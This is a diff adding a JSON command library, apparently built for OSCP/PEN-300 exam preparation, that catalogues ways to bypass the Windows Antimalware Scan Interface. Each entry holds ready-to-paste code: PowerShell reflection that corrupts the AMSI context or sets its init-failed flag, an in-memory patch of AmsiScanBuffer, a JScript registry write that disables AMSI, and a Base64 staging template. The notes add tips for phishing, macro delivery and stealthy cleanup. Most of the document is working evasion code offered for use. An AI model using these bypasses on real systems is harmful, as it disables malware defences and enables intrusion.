@@ -1,0 +1,178 @@
+{
+  "category": "AMSI Bypass",
+  "description": "Antimalware Scan Interface (AMSI) bypass techniques for PowerShell, JScript, and .NET environments. Critical for modern Windows post-exploitation.",
+  "commands": [
+    {
+      "id": "amsi-context-corruption",
+      "name": "AMSI Context Corruption (Reflection)",
+      "description": "Overwrite AMSI context structure header via .NET Reflection to force E_INVALIDARG errors. Most reliable method on older Windows 10 builds.",
+      "category": "amsi-bypass",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "amsi",
+        "powershell",
+        "reflection",
+        "memory-corruption",
+        "windows"
+      ],
+      "command": "[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*Context'}|%{[IntPtr]$ptr=$_.GetValue($null);[System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes(0),0,$ptr,4)}}",
+      "variables": [],
+      "notes": "Syntax:\nPaste directly into PowerShell session before executing AMSI-flagged code Test multiple bypass methods in lab before exam.\n\nContext corruption works on most Windows 10 1809-1909 builds.\n\nAlways have backup method ready.\n\nTime estimate:\n30 seconds References:\ndocs/av-evasion/amsi-bypass.md#context-corruption, PEN-300 Chapter 7.3.1 Manual alternative:\nUse obfuscation techniques, execute from non-AMSI context (cmd.exe -> powershell -EncodedCommand), or use alternate scripting languages (Python, compiled binaries)",
+      "success_indicators": [
+        "No output indicates success. Subsequent AMSI checks will return E_INVALIDARG and allow execution."
+      ],
+      "failure_indicators": [
+        ".NET version mismatch - Ensure PowerShell is using .NET 4.0+",
+        "Already patched by Defender updates - Try alternate methods",
+        "Insufficient permissions - Requires ability to modify process memory",
+        "AMSI context structure changed - Use memory patching method instead"
+      ]
+    },
+    {
+      "id": "amsi-init-failed",
+      "name": "AMSI Initialization Bypass",
+      "description": "Set amsiInitFailed flag to prevent AMSI initialization checks. Simpler than context corruption but may be detected by behavioral monitoring.",
+      "category": "amsi-bypass",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "amsi",
+        "powershell",
+        "reflection",
+        "initialization"
+      ],
+      "command": "[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*InitFailed'}|%{$_.SetValue($null,$true)}}",
+      "variables": [],
+      "notes": "Syntax:\nExecute before AMSI-flagged operations Faster than context corruption but potentially less reliable.\n\nGood for quick tests.\n\nCombine with obfuscation for better results.\n\nTime estimate:\n15 seconds References:\ndocs/av-evasion/amsi-bypass.md#initialization-bypass, PEN-300 Chapter 7.3.2 Manual alternative:\nUse PowerShell constrained language mode bypass, alternate execution contexts (runspaces), or compiled .NET assemblies",
+      "success_indicators": [
+        "No output. AMSI will report initialization failure and skip subsequent scans."
+      ],
+      "failure_indicators": [
+        "Flag already set - Not necessarily a problem, verify with test payload",
+        "Newer PowerShell versions may ignore this flag",
+        "Behavioral detection may flag the reflection operation itself"
+      ]
+    },
+    {
+      "id": "amsi-memory-patch",
+      "name": "AMSI Memory Patching (AmsiScanBuffer)",
+      "description": "Patch AmsiScanBuffer function in memory to always return clean result. Most reliable method but requires more code. Patches with 'XOR RAX,RAX; RET' to force AMSI_RESULT_CLEAN.",
+      "category": "amsi-bypass",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "amsi",
+        "powershell",
+        "memory-patching",
+        "function-hooking"
+      ],
+      "command": "$Win32=@\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\nAdd-Type $Win32\n$lib=[Win32]::LoadLibrary(\"amsi.dll\")\n$addr=[Win32]::GetProcAddress($lib,\"AmsiScanBuffer\")\n$p=0\n[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)\n$patch=[Byte[]](0x48,0x31,0xC0,0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,4)",
+      "variables": [],
+      "notes": "Syntax:\nExecute complete script in PowerShell session Most reliable across Windows versions.\n\nWorks even when other methods are patched.\n\nTakes 1-2 minutes to type if needed.\n\nSave as .ps1 file for quick deployment.\n\nTime estimate:\n2 minutes (manual typing) or 10 seconds (pre-staged file) References:\ndocs/av-evasion/amsi-bypass.md#memory-patching, PEN-300 Chapter 7.4 Manual alternative:\nUse DLL injection, process hollowing, or execute payloads from unmanaged memory contexts (C/C++ loaders)",
+      "success_indicators": [
+        "[+] AMSI patched successfully (if using verbose version). Silent operation indicates success."
+      ],
+      "failure_indicators": [
+        "VirtualProtect fails - May indicate DEP/ASLR protections or hooking by EDR",
+        "Win32 type already exists - Use different type name or restart PowerShell",
+        "Access denied - Requires SeDebugPrivilege or admin rights in some contexts",
+        "AMSI.DLL not loaded - Call AmsiInitialize first or load DLL manually"
+      ]
+    },
+    {
+      "id": "amsi-test-payload",
+      "name": "AMSI Test Payload",
+      "description": "Known AMSI-flagged string for testing bypass effectiveness. If this executes without error, AMSI is successfully bypassed.",
+      "category": "amsi-bypass",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "amsi",
+        "testing",
+        "validation"
+      ],
+      "command": "'Invoke-Mimikatz'",
+      "variables": [],
+      "notes": "Syntax:\nExecute after bypass attempt Always test bypass before executing real payload.\n\n'Invoke-Mimikatz', 'amsiutils', 'AmsiScanBuffer' are reliable test strings.\n\nSave time by testing early.\n\nTime estimate:\n5 seconds References:\ndocs/av-evasion/amsi-bypass.md#testing Manual alternative:\nUse VirusTotal or local Defender scan to validate if payload is flagged",
+      "success_indicators": [
+        "String echoes back without red 'This script contains malicious content' error. Success = bypass working."
+      ],
+      "failure_indicators": [
+        "Red error appears - Bypass failed, try alternate method",
+        "No output at all - PowerShell may have crashed, check session"
+      ]
+    },
+    {
+      "id": "amsi-base64-staging",
+      "name": "Base64 AMSI Bypass Staging",
+      "description": "Encode AMSI bypass in Base64 for command-line execution or evasion of string-based detections. Useful for initial access payloads.",
+      "category": "amsi-bypass",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "amsi",
+        "powershell",
+        "base64",
+        "obfuscation"
+      ],
+      "command": "powershell -EncodedCommand <BASE64_BYPASS>",
+      "variables": [
+        {
+          "name": "BASE64_BYPASS",
+          "description": "Base64-encoded AMSI bypass script",
+          "example": "",
+          "required": false
+        }
+      ],
+      "notes": "Syntax:\nGenerate Base64 encoded bypass command Useful for phishing payloads, macro delivery, or any scenario where command-line arguments are exposed.\n\nPre-generate and test before exam.\n\nTime estimate:\n1 minute References:\ndocs/av-evasion/amsi-bypass.md#obfuscation Manual alternative:\nUse alternate encodings (hex, compression), or deliver via encrypted channels (SSL/TLS)",
+      "success_indicators": [
+        "Bypass executes silently from encoded payload. Test with flagged string afterward."
+      ],
+      "failure_indicators": [
+        "Base64 corruption from copy/paste - Use file transfer",
+        "Character encoding mismatch - Must be UTF-16LE for PowerShell",
+        "Command line too long - Use staged approach with remote download"
+      ]
+    },
+    {
+      "id": "amsi-jscript-registry",
+      "name": "AMSI Bypass for JScript (Registry)",
+      "description": "Disable AMSI for JScript/VBScript by setting AmsiEnable registry value to 0. Requires user-level registry access (HKCU).",
+      "category": "amsi-bypass",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "amsi",
+        "jscript",
+        "vbscript",
+        "registry",
+        "wsh"
+      ],
+      "command": "var sh = new ActiveXObject(\"WScript.Shell\");\nvar key = \"HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\";\ntry {\n    var val = sh.RegRead(key);\n    if(val != 0) {\n        sh.RegWrite(key, 0, \"REG_DWORD\");\n    }\n} catch(e) {\n    sh.RegWrite(key, 0, \"REG_DWORD\");\n}\nWScript.Echo(\"AMSI disabled for WSH\");",
+      "variables": [],
+      "notes": "Syntax:\nAdd to .js file before malicious operations Useful for Office macro chains (VBA -> WScript -> JScript -> Payload).\n\nPersistent across reboots until key is removed.\n\nClean up for stealth.\n\nTime estimate:\n30 seconds References:\ndocs/av-evasion/amsi-bypass.md#jscript-bypass, PEN-300 Chapter 7.6 Manual alternative:\nExecute JScript from non-AMSI context, use COM objects instead of WScript, or compile to executable with JScript.NET",
+      "success_indicators": [
+        "Registry key set, AMSI disabled for current user's WSH sessions"
+      ],
+      "failure_indicators": [
+        "Registry access denied - Rare for HKCU, check user permissions",
+        "Key persists after execution - May alert defenders, clean up afterward",
+        "Doesn't affect PowerShell - This only disables AMSI for JScript/VBScript"
+      ]
+    }
+  ],
+  "oscp_relevance": "Critical for modern Windows exploitation. AMSI is default-enabled on Windows 10+ and blocks most public exploits/tools. Bypassing AMSI is often the first step in post-exploitation.",
+  "attack_chain_position": "Post-Exploitation, Privilege Escalation",
+  "related_categories": [
+    "powershell",
+    "evasion",
+    "windows"
+  ]
+}
